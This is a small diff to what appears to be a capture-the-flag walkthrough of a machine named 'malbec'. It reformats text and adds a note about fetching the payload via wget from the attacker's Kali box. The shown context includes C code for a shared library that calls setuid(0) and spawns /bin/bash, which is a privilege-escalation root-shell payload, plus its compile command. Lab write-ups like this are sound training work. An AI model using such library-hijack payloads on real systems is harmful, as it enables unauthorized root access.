@@ -341,7 +341,7 @@ malbec
 __cxa_finalize@@GLIBC_2.2.5
 ...
 ```
-The malbec string appears a couple of times in the output. Let's give this name a shot. To create our shell source code, we will issue the cat <<EOT >> rootshell.c command and then paste the following C code (including the newline character at the end) when presented with the > prompt:
+The `malbec` string appears a couple of times in the output. Let's give this name a shot. To create our shell source code, we will issue the `cat <<EOT >> rootshell.c` command and then paste the following C code (including the newline character at the end) when presented with the `>` prompt:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -382,6 +382,8 @@ void malbec() {
 setuid(0); setgid(0); system("/bin/bash");
 }
 ```
+Or just `wget from attacker's kali`
+
 Compiling the source code now produces the following error:
 ```bash 
 carlos@malbec:/home/carlos$ gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
